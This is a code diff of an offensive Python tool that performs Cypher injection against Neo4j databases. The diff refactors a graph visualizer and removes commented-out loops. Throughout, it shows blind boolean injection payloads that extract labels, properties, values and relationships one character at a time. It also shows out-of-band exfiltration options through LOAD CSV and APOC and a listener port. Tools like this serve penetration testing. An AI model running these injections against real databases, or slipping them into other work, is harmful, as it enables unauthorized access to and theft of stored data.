@@ -200,24 +200,17 @@ class NetworkVisualizer:
         # Create a PyVis network
         net = Network(notebook=True, height="1750px", width="100%", bgcolor="#222222", font_color="white", directed=True, select_menu=True, cdn_resources='remote')
         
-        # Add nodes and edges from relationships
-        for rel in relationships:
-            properties_text_target = ""
-            properties_text_source = ""
-            parts = rel.split('-')
-            source, relation, target = parts[0], parts[1].split(':')[1][:-1], parts[2].split('>')[1]
-            source_name_label = target_name_label = ""
-            
-            for json_file in json_files:
+        # Add nodes from json
+        for json_file in json_files:
                 node_properties = self.read_json_file(json_file)
                 for key, entry in node_properties.items():
-                    if key == source.split(":")[1]:
-                        properties_text_source, source_name_label = self.extract_properties(entry, source, 'name')
-                    elif key == target.split(":")[1]:
-                        properties_text_target, target_name_label = self.extract_properties(entry, target, 'title', 'name')
-                        
-            net.add_node(source, label=source_name_label, font={'size': 10}, title=properties_text_source, borderWidth=3)
-            net.add_node(target, label=target_name_label, font={'size': 10}, title=properties_text_target, borderWidth=3)
+                    properties_text_source, source_name_label = self.extract_properties(entry, key, 'title', 'name')
+                    net.add_node(key, label=source_name_label, font={'size': 10}, title=properties_text_source, borderWidth=3)
+
+        # Add edges from relationships
+        for rel in relationships:
+            parts = rel.split('-')
+            source, relation, target = parts[0].split(':')[1], parts[1].split(':')[1][:-1], parts[2].split('>')[1].split(':')[1]
             net.add_edge(source, target, label=relation, font={'size': 9}, color="red")
 
         self.configure_network(net)
@@ -228,7 +221,7 @@ class NetworkVisualizer:
 
     def extract_properties(self, properties, default_label, *lookup_keys):
         label = default_label
-        properties_text = f"ID: {default_label.split(':')[1]}\n"
+        properties_text = f"ID: {default_label}\n"
         for key, value in properties.items():
             if key in lookup_keys and not label:
                 label = value
@@ -407,7 +400,7 @@ class oob_Neo4jInjector:
                 self.exfil_payload = csv_exfil
                 csv = True
                 break
-        print(" " * 500, end='\r')
+        print(" " * 150, end='\r')
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability with APOC", end='\r', flush=True)
             anim_index += 1
@@ -443,7 +436,7 @@ class oob_Neo4jInjector:
             convert_dict_to_table(nested_dict)
             check_vulnerability(apoc_version)
             if (apoc_csv and apoc_json):
-                option = input("\nUse APOC to exfiltrate?\n Enter 1 for apoc.load.csv, 2 for apoc.load.json, anything else to not use APOC: ").lower()
+                option = input("\nUse APOC to exfiltrate?\nEnter 1 for apoc.load.csv, 2 for apoc.load.json, anything else to not use APOC: ").lower()
                 if option == "1":
                     self.exfil_payload = apoc_csv_exfil
                 elif (option == "2"):
@@ -452,14 +445,14 @@ class oob_Neo4jInjector:
                     self.exfil_payload = csv_exfil
                     print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
             elif (not apoc_csv and apoc_json):
-                option = input("\nUse APOC to exfiltrate?\n Enter 1 for apoc.load.json, anything else to not use APOC: ").lower()
+                option = input("\nUse APOC to exfiltrate?\nEnter 1 for apoc.load.json, anything else to not use APOC: ").lower()
                 if (option == "1"):
                     self.exfil_payload = apoc_json_exfil
                 else:
                     self.exfil_payload = csv_exfil
                     print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
             elif (apoc_csv and not apoc_json):
-                option = input("\nUse APOC to exfiltrate?\n Enter 1 for apoc.load.csv, anything else to not use APOC: ").lower()
+                option = input("\nUse APOC to exfiltrate?\nEnter 1 for apoc.load.csv, anything else to not use APOC: ").lower()
                 if (option == "1"):
                     self.exfil_payload = apoc_csv_exfil
                 else:
@@ -817,17 +810,6 @@ class ib_Neo4jInjector:
         anim_index = 0
         label_sizes_dict = {}
         for count_index in range(label_count):
-            # threads = []
-            # label_sizes_dict = DictHolder()
-            # stop_event = threading.Event()
-            # for i in range(self.threads):
-            #     threads.append(threading.Thread(target=self.find_label_size_part, args=(label_sizes_dict, count_index, (MAXSIZE // self.threads), ((MAXSIZE // self.threads) * i), stop_event)))
-            # if (MAXSIZE % self.threads != 0):
-            #     threads.append(threading.Thread(target=self.find_label_size_part, args=(label_sizes_dict, count_index, (MAXSIZE % self.threads), (MAXSIZE - (MAXSIZE % self.threads), stop_event))))
-            # start_threads(threads)
-            # print(f"[-] dumping label sizes, might take awhile", end='\r', flush=True)
-            # join_threads(threads)
-
             break_flag = False
             for size_index in range(1000):
                 responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
@@ -841,7 +823,6 @@ class ib_Neo4jInjector:
                 if (break_flag):
                     break
         print(" " * 70, end='\r')
-        # return label_sizes_dict.get()
         return label_sizes_dict
     
     def find_label_size_part(self, label_sizes_dict, count_index, size, offset, stop_event):
@@ -880,20 +861,6 @@ class ib_Neo4jInjector:
             join_threads(threads)
             stop_event.set()
             printer_thread.join()
-            # label = ''
-            # for size_index in range(size):
-            #     break_flag = False
-            #     for char in valid_chars:
-            #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-            #         print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
-            #         anim_index += 1
-            #         for response in responses:
-            #             break_flag = self.check_true(response)
-            #             if (break_flag):
-            #                 label += char
-            #                 break
-            #         if (break_flag):
-            #             break
             print(" " * 70, end='\r')
             print(f"[+] {label.get_whole()}")
             labels.append(label.get_whole())
@@ -904,12 +871,9 @@ class ib_Neo4jInjector:
             break_flag = False
             for char in valid_chars:
                 responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                # print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
-                # anim_index += 1
                 for response in responses:
                     break_flag = self.check_true(response)
                     if (break_flag):
-                        # label_part = label_part[:(size_index - offset)] + char + label_part[(size_index - offset + 1):]
                         label.update_part(label_part, char, size_index - offset)
                         break
                 if (break_flag):
@@ -989,21 +953,6 @@ class ib_Neo4jInjector:
                 join_threads(threads)
                 stop_event.set()
                 printer_thread.join()
-
-                # pr0perty = ''
-                # for size_index in range(size):
-                #     break_flag = False
-                #     for char in valid_chars:
-                #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
-                #         print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
-                #         anim_index += 1
-                #         for response in responses:
-                #             break_flag = self.check_true(response)
-                #             if (break_flag):
-                #                     pr0perty += char
-                #                     break 
-                #         if (break_flag):
-                #             break
                 print(" " * 70, end='\r') 
                 print(f"[++] {pr0perty.get_whole()}")
                 if label in properties_dict:
@@ -1017,8 +966,6 @@ class ib_Neo4jInjector:
             break_flag = False
             for char in valid_chars:
                 responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
-                # print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
-                # anim_index += 1
                 for response in responses:
                     break_flag = self.check_true(response)
                     if (break_flag):
@@ -1116,20 +1063,6 @@ class ib_Neo4jInjector:
                     join_threads(threads)
                     stop_event.set()
                     printer_thread.join()
-                    # value = ''
-                    # for size_index in range(size):
-                    #     break_flag = False
-                    #     for char in valid_chars:
-                    #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                    #         print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
-                    #         anim_index += 1
-                    #         for response in responses:
-                    #             break_flag = self.check_true(response)
-                    #             if (break_flag):
-                    #                 value += char
-                    #                 break  # Found the size for this occurrence, no need to continue
-                    #         if (break_flag):
-                    #             break
                     print(" " * 70, end='\r') 
                     print(f"[+++] {''.join(value.get_whole().split('::')[1::])}")
 
@@ -1241,20 +1174,6 @@ class ib_Neo4jInjector:
             join_threads(threads)
             stop_event.set()
             printer_thread.join()
-            # rel_type = ''
-            # for size_index in range(size):
-            #     break_flag = False
-            #     for char in valid_chars:
-            #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-            #         print(f"[{animation[anim_index % len(animation)]}] building relationship type: {rel_type}{char}", end='\r', flush=True)
-            #         anim_index += 1
-            #         for response in responses:
-            #             break_flag = self.check_true(response)
-            #             if (break_flag):
-            #                 rel_type += char
-            #                 break
-            #         if (break_flag):
-            #             break
             print(" " * 70, end='\r')
             print(f"[+] {rel_type.get_whole()}")
             rel_types.append(rel_type.get_whole())
@@ -1347,20 +1266,6 @@ class ib_Neo4jInjector:
                 join_threads(threads)
                 stop_event.set()
                 printer_thread.join()
-                # rel = ''
-                # for size_index in range(size):
-                #     break_flag = False
-                #     for char in valid_chars:
-                #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                #         print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
-                #         anim_index += 1
-                #         for response in responses:
-                #             break_flag = self.check_true(response)
-                #             if (break_flag):
-                #                     rel += char
-                #                     break 
-                #         if (break_flag):
-                #             break
                 print(" " * 70, end='\r') 
                 print(f"[++] {rel.get_whole()}")
                 rels_dict[rel_type] = rel.get_whole()
@@ -1447,7 +1352,7 @@ def main():
     parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
 
-    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC.LOAD.JSON")
+    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC.LOAD.JSON/CSV")
     parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode, uses boolean based injection")
 
     parser.add_argument("--dump-all", action="store_true", help="Dumps all data")
@@ -1523,7 +1428,6 @@ def main():
         elif args.label and args.properties:
             labels = args.label.split(',')
             properties_dict = injector.dump_properties(labels)
-            print(properties_dict)
 
         elif args.label and args.property:
             properties_dict = {}
